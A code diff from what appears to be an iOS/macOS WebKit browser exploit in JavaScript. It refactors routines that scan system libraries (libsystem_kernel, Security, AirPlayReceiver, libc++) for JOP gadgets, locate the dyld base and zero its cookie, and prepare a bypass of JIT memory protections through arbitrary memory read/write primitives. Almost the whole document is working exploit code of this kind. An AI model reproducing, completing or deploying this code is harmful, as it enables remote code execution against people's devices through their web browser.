@@ -324,6 +324,175 @@ function obtain_libcpp_base(vtab_addr) {
     return libcpp1_base;
 }
 
+function find_stackloader_gadget(libsystem_kernel_base, mach_vm_map_addr) {
+    //FIND GADGETS...
+    // 1. STACKLOADER
+    var try_count = 0;
+    var stackloader = Add(libsystem_kernel_base, mach_vm_map_addr);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed find_stackloader_gadget`);
+            return null;
+        }
+
+        // libsystem_kernel:__text:0000000180A61720 FD 7B 46 A9                             LDP             X29, X30, [SP,#0x60+var_s0]
+        // libsystem_kernel:__text:0000000180A61724 F4 4F 45 A9                             LDP             X20, X19, [SP,#0x60+var_10]
+        // libsystem_kernel:__text:0000000180A61728 F6 57 44 A9                             LDP             X22, X21, [SP,#0x60+var_20]
+        // libsystem_kernel:__text:0000000180A6172C F8 5F 43 A9                             LDP             X24, X23, [SP,#0x60+var_30]
+        // libsystem_kernel:__text:0000000180A61730 FA 67 42 A9                             LDP             X26, X25, [SP,#0x60+var_40]
+        // libsystem_kernel:__text:0000000180A61734 FC 6F 41 A9                             LDP             X28, X27, [SP,#0x60+var_50]
+        // libsystem_kernel:__text:0000000180A61738 FF C3 01 91                             ADD             SP, SP, #0x70 ; 'p'
+        // libsystem_kernel:__text:0000000180A6173C C0 03 5F D6                             RET
+        opcode = read64(stackloader);
+        opcode2 = read64(Add(stackloader, 0x8))
+        opcode3 = read64(Add(stackloader, 0x10))
+        opcode4 = read64(Add(stackloader, 0x18))
+        if(opcode == 0xA9454FF4A9467BFD && opcode2 == 0xA9435FF8A94457F6 && opcode3 == 0xA9416FFCA94267FA && opcode4 == 0xD65F03C09101C3FF) {
+            break;
+        }
+        stackloader = Add(stackloader, 0x8);
+        try_count++;
+    }
+
+    return stackloader;
+}
+
+function find_ldrx8_gadget(security_base, SSLGetPeerDomainName_addr) {
+    var try_count = 0;
+    var ldrx8 = Add(security_base, SSLGetPeerDomainName_addr);
+    while (true) {
+        if(try_count > 200) {
+            log(`[-] failed find_ldrx8_gadget`);
+            return;
+        }
+
+        // Security:__text:0000000181B5C478                 LDR             X8, [SP]
+        // Security:__text:0000000181B5C47C                 STR             X8, [X19]
+        // Security:__text:0000000181B5C480
+        // Security:__text:0000000181B5C480 loc_181B5C480                           ; CODE XREF: _SSLGetPeerDomainName_0+2C↑j
+        // Security:__text:0000000181B5C480                                         ; _SSLGetPeerDomainName_0+44↑j ...
+        // Security:__text:0000000181B5C480                 LDP             X29, X30, [SP,#0x20]
+        // Security:__text:0000000181B5C484                 LDP             X20, X19, [SP,#0x10]
+        // Security:__text:0000000181B5C488                 ADD             SP, SP, #0x30 ; '0'
+        // Security:__text:0000000181B5C48C                 RET
+        opcode = read64(ldrx8);
+        opcode2 = read64(Add(ldrx8, 0x8))
+        opcode3 = read64(Add(ldrx8, 0x10))
+        if(opcode == 0xF9000268F94003E8 && opcode2 == 0xA9414FF4A9427BFD && opcode3 == 0xD65F03C09100C3FF) {
+            break;
+        }
+        ldrx8 = Add(ldrx8, 0x8);
+        try_count++;
+    }
+
+    return ldrx8;
+}
+
+function find_dispatch_gadget(airplayreceiver_base, APAdvertiserGetTypeID_addr) {
+    var try_count = 0;
+    var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
+    dispatch = Sub(dispatch, 0x2000);
+    while (true) {
+        if(try_count > 13000) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // AirPlayReceiver:__text:00000001A9AC7958 A0 02 3F D6                             BLR             X21
+        // AirPlayReceiver:__text:00000001A9AC795C FD 7B 43 A9                             LDP             X29, X30, [SP,#0x30]
+        // AirPlayReceiver:__text:00000001A9AC7960 F4 4F 42 A9                             LDP             X20, X19, [SP,#0x20]
+        // AirPlayReceiver:__text:00000001A9AC7964 F6 57 41 A9                             LDP             X22, X21, [SP,#0x10]
+        // AirPlayReceiver:__text:00000001A9AC7968 FF 03 01 91                             ADD             SP, SP, #0x40 ; '@'
+        // AirPlayReceiver:__text:00000001A9AC796C C0 03 5F D6                             RET
+        opcode = read32(dispatch);
+        if(opcode == 0xD63F02A0) {
+            if(read32(Add(dispatch, 4)) == 0xA9437BFD && read32(Add(dispatch, 8)) == 0xA9424FF4 && read32(Add(dispatch, 12)) == 0xA94157F6 && read32(Add(dispatch, 16)) == 0x910103FF && read32(Add(dispatch, 20)) == 0xD65F03C0)
+                break;
+        }
+        dispatch = Sub(dispatch, 4);
+        try_count++;
+    }
+    return dispatch;
+}
+
+function find_movx4_gadget(libcpp1_base, znst3_addr) {
+    var try_count = 0;
+    var movx4 = Add(libcpp1_base, znst3_addr);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // libc++.1:__text:000000018004314C E4 03 14 AA                             MOV             X4, X20
+        // libc++.1:__text:0000000180043150 00 01 3F D6                             BLR             X8
+        opcode = read32(movx4);
+        if(opcode == 0xAA1403E4) {
+            if(read32(Add(movx4, 4)) == 0xD63F0100)
+                break;
+        }
+        movx4 = Add(movx4, 4);
+        try_count++;
+    }
+
+    return movx4;
+}
+
+function find_regloader_gadget(libcpp1_base, znkst3_addr) {
+    try_count = 0;
+    var regloader = Add(libcpp1_base, znkst3_addr);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // libc++.1:__text:0000000180056D18 E3 03 16 AA                             MOV             X3, X22
+        // libc++.1:__text:0000000180056D1C E6 03 1B AA                             MOV             X6, X27
+        // libc++.1:__text:0000000180056D20 E0 03 18 AA                             MOV             X0, X24
+        // libc++.1:__text:0000000180056D24 E1 03 13 AA                             MOV             X1, X19
+        // libc++.1:__text:0000000180056D28 E2 03 17 AA                             MOV             X2, X23
+        // libc++.1:__text:0000000180056D2C E4 03 40 F9                             LDR             X4, [SP]
+        // libc++.1:__text:0000000180056D30 00 01 3F D6                             BLR             X8
+        opcode = read32(regloader);
+        if(opcode == 0xAA1603E3) {
+            if(read32(Add(regloader, 4)) == 0xAA1B03E6
+                && read32(Add(regloader, 8)) == 0xAA1803E0
+                && read32(Add(regloader, 12)) == 0xAA1303E1
+                && read32(Add(regloader, 16)) == 0xAA1703E2
+                && read32(Add(regloader, 20)) == 0xF94003E4
+                && read32(Add(regloader, 24)) == 0xD63F0100)
+                break;
+        }
+        regloader = Add(regloader, 4);
+        try_count++;
+    }
+    return regloader;
+}
+
+function obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr) {
+    var __Z27setNotifyMonitoringDyldMainPFvvE_addr = Add(dyld_process_info_notify_release_addr, 4);
+    var __ZL25sNotifyMonitoringDyldMain_addr = follow_adrpLdr(Add(libdyld_base, __Z27setNotifyMonitoringDyldMainPFvvE_addr));
+    var __ZL25sNotifyMonitoringDyldMain = read64(__ZL25sNotifyMonitoringDyldMain_addr);
+
+    try_count = 0;
+    var dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, __ZL25sNotifyMonitoringDyldMain.lo() & 0xfff);
+    dyld_base = Sub(dyld_base, 0x7000);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+        opcode = read64(dyld_base);
+        if(opcode == 0x100000CFEEDFACF) {
+            break;
+        }
+        dyld_base = Sub(dyld_base, 0x1000);
+        try_count++;
+    }
+    return dyld_base;
+}
+
 function pwn() {
     offsets.resolve();
 
@@ -447,15 +616,13 @@ function pwn() {
     // 1. Obtain libc++.1 base
     log(`[Stage 1] Obtaining libc++.1 base...`);
     var libcpp1_base = obtain_libcpp_base(vtab_addr);
-    log(`[+] Obtained libc++.1 base: ${libcpp1_base}`);
+    log(`[+] Obtained libc++.1 base: ${libcpp1_base}\n`);
 
     // 2. Obtain Libs Base
     log(`[Stage 2] Obtaining other dylibs base...`);
     const dylibNames = [
         "/usr/lib/system/libdyld.dylib",
         "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
-        "/System/Library/Frameworks/CoreAudio.framework/CoreAudio",
-        "/System/Library/PrivateFrameworks/WebCore.framework/WebCore",
         "/System/Library/Frameworks/Security.framework/Security",
         "/System/Library/PrivateFrameworks/AirPlayReceiver.framework/AirPlayReceiver",
         "/usr/lib/system/libsystem_platform.dylib",
@@ -466,14 +633,12 @@ function pwn() {
 
     var libdyld_base = dylibBases[0];
     var jsc_base = dylibBases[1];
-    var coreaudio_base = dylibBases[2];
-    var webcore_base = dylibBases[3];
-    var security_base = dylibBases[4];
-    var airplayreceiver_base = dylibBases[5];
-    var libsystem_platform_base = dylibBases[6];
-    var libsystem_kernel_base = dylibBases[7];
-    var libsystem_c_base = dylibBases[8];
-    log(`[+] Obtained other dylibs base.`);
+    var security_base = dylibBases[2];
+    var airplayreceiver_base = dylibBases[3];
+    var libsystem_platform_base = dylibBases[4];
+    var libsystem_kernel_base = dylibBases[5];
+    var libsystem_c_base = dylibBases[6];
+    log(`[+] Obtained other dylibs base.\n`);
 
 
     // 3. Obtain func offsets from symbol name
@@ -536,232 +701,38 @@ function pwn() {
     symbolsAddr = resolve_symbol_addresses(libcpp1_base, libcpp1_symbols);
     var znst3_addr = symbolsAddr[0];
     var znkst3_addr = symbolsAddr[1];
-    log(`[+] Obtained func offsets.`);
+    log(`[+] Obtained func offsets.\n`);
+
+    // 4. Find gadgets for code execution...
+    log(`[Stage 4] Finding JOP gadgets for code execution...`);
+    var stackloader = find_stackloader_gadget(libsystem_kernel_base, mach_vm_map_addr);
+    log(`[+] stackloader gadget: ${stackloader}`);
+    var ldrx8 = find_ldrx8_gadget(security_base, SSLGetPeerDomainName_addr);
+    log(`[+] ldrx8 gadget: ${ldrx8}`);
+    var dispatch = find_dispatch_gadget(airplayreceiver_base, APAdvertiserGetTypeID_addr);
+    log(`[+] dispatch gadget: ${dispatch}`);
+    var movx4 = find_movx4_gadget(libcpp1_base, znst3_addr);
+    log(`[+] movx4 gadget: ${movx4}`);
+    var regloader = find_regloader_gadget(libcpp1_base, znkst3_addr);
+    log(`[+] regloader gadget: ${regloader}`);
+    log(`[+] Obtained JOP gadgets.\n`);
 
 
+    // 5. Obtain /usr/lib/dyld base...
+    log(`[Stage 5] Obtaining /usr/lib/dyld base...`);
+    var dyld_base = obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr);
+    log(`[+] /usr/lib/dyld: ${dyld_base}`);
+    log(`[+] Obtained /usr/lib/dyld base.\n`);
 
-
-
-
-
-
-
-
-
-
-
-
-
-    // 4. LEFT THINGS... NEED TO BE CLEAN code...
-    var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
-    __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
-    log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
-    
-
-    
-    
-    //FIND GADGETS...
-    // 1. STACKLOADER
-    try_count = 0;
-    var stackloader = Add(libsystem_kernel_base, mach_vm_map_addr);
-    while (true) {
-        if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        // libsystem_kernel:__text:0000000180A61720 FD 7B 46 A9                             LDP             X29, X30, [SP,#0x60+var_s0]
-        // libsystem_kernel:__text:0000000180A61724 F4 4F 45 A9                             LDP             X20, X19, [SP,#0x60+var_10]
-        // libsystem_kernel:__text:0000000180A61728 F6 57 44 A9                             LDP             X22, X21, [SP,#0x60+var_20]
-        // libsystem_kernel:__text:0000000180A6172C F8 5F 43 A9                             LDP             X24, X23, [SP,#0x60+var_30]
-        // libsystem_kernel:__text:0000000180A61730 FA 67 42 A9                             LDP             X26, X25, [SP,#0x60+var_40]
-        // libsystem_kernel:__text:0000000180A61734 FC 6F 41 A9                             LDP             X28, X27, [SP,#0x60+var_50]
-        // libsystem_kernel:__text:0000000180A61738 FF C3 01 91                             ADD             SP, SP, #0x70 ; 'p'
-        // libsystem_kernel:__text:0000000180A6173C C0 03 5F D6                             RET
-        opcode = read64(stackloader);
-        opcode2 = read64(Add(stackloader, 0x8))
-        opcode3 = read64(Add(stackloader, 0x10))
-        opcode4 = read64(Add(stackloader, 0x18))
-        if(opcode == 0xA9454FF4A9467BFD && opcode2 == 0xA9435FF8A94457F6 && opcode3 == 0xA9416FFCA94267FA && opcode4 == 0xD65F03C09101C3FF) {
-            break;
-        }
-        stackloader = Add(stackloader, 0x8);
-        try_count++;
-    }
-
-    log(`[+] stackloader: ${stackloader}`);
-
-    // 2. LDRX8
-    // var SSLGetPeerDomainName_addr = find_symbol_address(security_base, "__SSLGetPeerDomainName");
-    log(`[+] SSLGetPeerDomainName_addr: ${SSLGetPeerDomainName_addr}`);
-    try_count = 0;
-    var ldrx8 = Add(security_base, SSLGetPeerDomainName_addr);
-    while (true) {
-        if(try_count > 200) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        // Security:__text:0000000181B5C478                 LDR             X8, [SP]
-        // Security:__text:0000000181B5C47C                 STR             X8, [X19]
-        // Security:__text:0000000181B5C480
-        // Security:__text:0000000181B5C480 loc_181B5C480                           ; CODE XREF: _SSLGetPeerDomainName_0+2C↑j
-        // Security:__text:0000000181B5C480                                         ; _SSLGetPeerDomainName_0+44↑j ...
-        // Security:__text:0000000181B5C480                 LDP             X29, X30, [SP,#0x20]
-        // Security:__text:0000000181B5C484                 LDP             X20, X19, [SP,#0x10]
-        // Security:__text:0000000181B5C488                 ADD             SP, SP, #0x30 ; '0'
-        // Security:__text:0000000181B5C48C                 RET
-        opcode = read64(ldrx8);
-        opcode2 = read64(Add(ldrx8, 0x8))
-        opcode3 = read64(Add(ldrx8, 0x10))
-        if(opcode == 0xF9000268F94003E8 && opcode2 == 0xA9414FF4A9427BFD && opcode3 == 0xD65F03C09100C3FF) {
-            break;
-        }
-        ldrx8 = Add(ldrx8, 0x8);
-        try_count++;
-    }
-    log(`[+] ldrx8: ${ldrx8}`);
-
-
-
-
-
-    // 3. DISPATCH
-    // var APAdvertiserGetTypeID_addr = find_symbol_address(airplayreceiver_base, "__APAdvertiserGetTypeID");
-    log(`[+] APAdvertiserGetTypeID_addr: ${APAdvertiserGetTypeID_addr}`);
-    try_count = 0;
-    var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
-    dispatch = Sub(dispatch, 0x2000);
-    while (true) {
-        if(try_count > 13000) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        // AirPlayReceiver:__text:00000001A9AC7958 A0 02 3F D6                             BLR             X21
-        // AirPlayReceiver:__text:00000001A9AC795C FD 7B 43 A9                             LDP             X29, X30, [SP,#0x30]
-        // AirPlayReceiver:__text:00000001A9AC7960 F4 4F 42 A9                             LDP             X20, X19, [SP,#0x20]
-        // AirPlayReceiver:__text:00000001A9AC7964 F6 57 41 A9                             LDP             X22, X21, [SP,#0x10]
-        // AirPlayReceiver:__text:00000001A9AC7968 FF 03 01 91                             ADD             SP, SP, #0x40 ; '@'
-        // AirPlayReceiver:__text:00000001A9AC796C C0 03 5F D6                             RET
-        opcode = read32(dispatch);
-        if(opcode == 0xD63F02A0) {
-            if(read32(Add(dispatch, 4)) == 0xA9437BFD && read32(Add(dispatch, 8)) == 0xA9424FF4 && read32(Add(dispatch, 12)) == 0xA94157F6 && read32(Add(dispatch, 16)) == 0x910103FF && read32(Add(dispatch, 20)) == 0xD65F03C0)
-                break;
-        }
-        dispatch = Sub(dispatch, 4);
-        try_count++;
-    }
-    log(`[+] dispatch: ${dispatch}`);
-
-
-
-
-    // 4. MOVX4
-    // var znst3_addr = find_symbol_address(libcpp1_base, "___ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsEt");
-    log(`[+] znst3_addr: ${znst3_addr}`);
-    try_count = 0;
-    var movx4 = Add(libcpp1_base, znst3_addr);
-    while (true) {
-        if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        // libc++.1:__text:000000018004314C E4 03 14 AA                             MOV             X4, X20
-        // libc++.1:__text:0000000180043150 00 01 3F D6                             BLR             X8
-        opcode = read32(movx4);
-        if(opcode == 0xAA1403E4) {
-            if(read32(Add(movx4, 4)) == 0xD63F0100)
-                break;
-        }
-        movx4 = Add(movx4, 4);
-        try_count++;
-    }
-    log(`[+] movx4: ${movx4}`);
-
-
-
-
-
-    // 5. REGLOADER
-    // var znkst3_addr = find_symbol_address(libcpp1_base, "___ZNKSt3__18time_putIcNS_19ostreambuf_iteratorIcNS_11char_traitsIcEEEEE3putES4_RNS_8ios_baseEcPK2tmPKcSC_");
-    log(`[+] znkst3_addr: ${znkst3_addr}`);
-    try_count = 0;
-    var regloader = Add(libcpp1_base, znkst3_addr);
-    while (true) {
-        if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        // libc++.1:__text:0000000180056D18 E3 03 16 AA                             MOV             X3, X22
-        // libc++.1:__text:0000000180056D1C E6 03 1B AA                             MOV             X6, X27
-        // libc++.1:__text:0000000180056D20 E0 03 18 AA                             MOV             X0, X24
-        // libc++.1:__text:0000000180056D24 E1 03 13 AA                             MOV             X1, X19
-        // libc++.1:__text:0000000180056D28 E2 03 17 AA                             MOV             X2, X23
-        // libc++.1:__text:0000000180056D2C E4 03 40 F9                             LDR             X4, [SP]
-        // libc++.1:__text:0000000180056D30 00 01 3F D6                             BLR             X8
-        opcode = read32(regloader);
-        if(opcode == 0xAA1603E3) {
-            if(read32(Add(regloader, 4)) == 0xAA1B03E6
-                && read32(Add(regloader, 8)) == 0xAA1803E0
-                && read32(Add(regloader, 12)) == 0xAA1303E1
-                && read32(Add(regloader, 16)) == 0xAA1703E2
-                && read32(Add(regloader, 20)) == 0xF94003E4
-                && read32(Add(regloader, 24)) == 0xD63F0100)
-                break;
-        }
-        regloader = Add(regloader, 4);
-        try_count++;
-    }
-    log(`[+] regloader: ${regloader}`);
-
-
-
-
-    //OBTAIN DYLD_BASE
-    // var dyld_process_info_notify_release_addr = find_symbol_address(libdyld_base, "___dyld_process_info_notify_release");
-    log(`[+] dyld_process_info_notify_release_addr: ${dyld_process_info_notify_release_addr}`);
-    var __Z27setNotifyMonitoringDyldMainPFvvE_addr = Add(dyld_process_info_notify_release_addr, 4);
-
-    var __ZL25sNotifyMonitoringDyldMain_addr = follow_adrpLdr(Add(libdyld_base, __Z27setNotifyMonitoringDyldMainPFvvE_addr));
-    log(`[+] __ZL25sNotifyMonitoringDyldMain_addr: ${__ZL25sNotifyMonitoringDyldMain_addr}`);
-
-    var __ZL25sNotifyMonitoringDyldMain = read64(__ZL25sNotifyMonitoringDyldMain_addr);
-    log(`[+] __ZL25sNotifyMonitoringDyldMain: ${__ZL25sNotifyMonitoringDyldMain}`);
-
-    try_count = 0;
-    var dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, __ZL25sNotifyMonitoringDyldMain.lo() & 0xfff);
-    dyld_base = Sub(dyld_base, 0x8000);
-    while (true) {
-        if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-        opcode = read64(dyld_base);
-        if(opcode == 0x100000CFEEDFACF) {
-            break;
-        }
-        dyld_base = Sub(dyld_base, 0x1000);
-        try_count++;
-    }
-    log(`[i] dyld_base = ${dyld_base}`);
-    // return;
-
-    // log(`[i] dyld_base = ${dyld_base} -> ${read64(dyld_base)}`);
-    // var cookieAddr = Add(dyld_base, offsets.cookieAddr);alert(1);
-
-
-
-    //fail
-    // var __ZZ6dlopenE1p_addr = find_symbol_address(libdyld_base, "__ZZ6dlopenE1p");
-    // log(`[+] __ZZ6dlopenE1p: ${__ZZ6dlopenE1p_addr}`);
+    return;
 
     // needed arguments to call stage1's _load
     var dlsym = Add(libdyld_base, dlsym_addr);
     
     // needed to bypass seperated RW, RX JIT mitigation
+    var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
+    __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
+    log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
     var __MergedGlobals_52 = read64(Add(jsc_base, __MergedGlobals_52_addr));
     var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
     var memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
@@ -774,30 +745,11 @@ function pwn() {
     var mach_vm_protect = Add(libsystem_kernel_base, mach_vm_protect_addr);
     var mach_task_self_ = read64(Add(libsystem_kernel_base, mach_task_self_addr));
 
-    // longjmp mitigation?; nullify when read *(uint64_t *)(_ReadStatusReg(TPIDRRO_EL0) + 0x38);
-    // var dyld_base;
-    // var __ZZ6dlopenE1p = read64(Add(libdyld_base, offsets.__ZZ6dlopenE1p));
-    // log(`[i] __ZZ6dlopenE1p = ${__ZZ6dlopenE1p}`);
-    // dyld_base = Sub(__ZZ6dlopenE1p, offsets.dlopen_internal); //_dlopen_internal = 0xc918
-    // if(__ZZ6dlopenE1p == 0) {
-    //     log(`[-] __ZZ6dlopenE1p is 0, finding other offsets`);
-    //     var __ZL25sNotifyMonitoringDyldMain = read64(Add(libdyld_base, offsets.__ZL25sNotifyMonitoringDyldMain));
-    //     log(`[i] __ZL25sNotifyMonitoringDyldMain = ${__ZL25sNotifyMonitoringDyldMain}`);
-    //     dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, offsets.__ZN4dyldL24notifyMonitoringDyldMainEv); //__ZN4dyldL24notifyMonitoringDyldMainEv = 0x8a1c
-    // }
-
     log(`[i] dyld_base = ${dyld_base}`);
     var cookieAddr = Add(dyld_base, offsets.cookieAddr);
     log(`[i] read cookie  = ${read64(cookieAddr)}`);
     write64(cookieAddr, new Int64(0));
     log(`[i] writechk  = ${read64(cookieAddr)}`);
-
-    //gadgets
-    // var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
-    // var ldrx8 = Add(webcore_base, offsets.ldrx8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
-    // var dispatch = Add(coreaudio_base, offsets.dispatch)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
-    // var movx4 = Add(webcore_base, offsets.movx4);    //v E4 03 14 AA 00 01 3F D6 
-    // var regloader = Add(libcpp1_base, offsets.regloader); //v E3 03 16 AA E6 03 1B AA E0 03 18 AA E1 03 13 AA E2 03 17 AA E4 03 40 F9 00 01 3F D6
 
     // JOP START !!!
     var x19 = malloc(0x100);
